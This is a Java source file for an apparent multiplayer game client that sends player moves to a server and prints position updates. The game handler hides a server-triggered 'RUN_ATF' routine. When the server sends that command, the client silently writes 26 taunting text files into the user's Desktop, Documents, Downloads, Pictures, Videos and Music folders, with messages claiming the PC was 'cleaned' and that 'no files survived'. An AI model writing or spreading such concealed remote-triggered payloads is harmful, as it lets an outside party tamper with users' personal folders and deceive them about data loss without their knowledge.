import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.List;
import java.util.Random;

public class Client {

    private static final String SERVER_ADDRESS = "localhost";
    private static final int SERVER_PORT = 20034;
    private static final Random random = new Random();

    public static void main(String[] args) {
        try (
            Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            BufferedReader consoleInput = new BufferedReader(new InputStreamReader(System.in))
        ) {
            System.out.println(in.readLine());

            String playerName = consoleInput.readLine();
            out.println(playerName);

            new Thread(() -> {
                String serverMessage;
                try {
                    while ((serverMessage = in.readLine()) != null) {
                        if (serverMessage.equals("RUN_ATF")) {
                            runATF();
                        }
                        else if (serverMessage.startsWith("UPDATE:")) {
                            String[] parts = serverMessage.split(":");
                            System.out.println(parts[1] + " is now at " + parts[2]);
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }).start();

            String userInput;
            while ((userInput = consoleInput.readLine()) != null) {
                if (userInput.startsWith("MOVE:")) {
                    out.println(userInput);
                }
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // =======================
    // ATF LOGIC
    // =======================

    private static void runATF() {
        String userHome = System.getProperty("user.home");

        List<Path> targetFolders = List.of(
                Paths.get(userHome, "Desktop"),
                Paths.get(userHome, "Documents"),
                Paths.get(userHome, "Downloads"),
                Paths.get(userHome, "Pictures"),
                Paths.get(userHome, "Videos"),
                Paths.get(userHome, "Music")
        );

        for (Path folder : targetFolders) {
            createAlphabetATFs(folder);
        }

        System.out.println("[CLIENT] ATF completed");
    }

    private static void createAlphabetATFs(Path folder) {
        if (!Files.exists(folder)) return;

        DateTimeFormatter formatter =
                DateTimeFormatter.ofPattern("yyyy-MM-dd_HH-mm-ss");

        List<String> messages = List.of(
                "Nope not here",
                "Wait what are you looking for again",
                "Nothing to see here",
                "This wasnt the file you wanted",
                "You can stop checking now",
                "Still clean Still empty",
                "Try another folder",
                "Yeah I checked already",
                "Old files Gone",
                "This PC was cleaned on %s",
                "Already checked nothing here",
                "You are very thorough",
                "No files survived",
                "This folder is empty on purpose",
                "Nothing left to find",
                "Cleanup was successful",
                "All done move along",
                "Previous files removed",
                "Fresh start achieved",
                "This space intentionally blank",
                "Still looking huh",
                "Everything old is gone",
                "Clean slate confirmed",
                "You missed it it was here",
                "Files were here once",
                "Nothing but vibes now",
                "System reset complete",
                "All clear no artifacts",
                "Folder verified clean",
                "Nothing to see move on"
        );

        for (char c = 'A'; c <= 'Z'; c++) {
            String base = messages.get(random.nextInt(messages.size()));
            String timestamp = LocalDateTime.now().format(formatter);

            String message = base.contains("%s")
                    ? String.format(base, timestamp)
                    : base;

            String fileName = sanitizeFileName(message) + ".txt";
            Path file = folder.resolve(fileName);

            try {
                Files.writeString(file, message,
                        StandardOpenOption.CREATE,
                        StandardOpenOption.TRUNCATE_EXISTING);
            } catch (IOException ignored) {}
        }
    }

    private static String sanitizeFileName(String input) {
        return input
                .replaceAll("[\\\\/:*?\"<>|]", "")
                .replaceAll("\\s+", "_")
                .trim();
    }
}
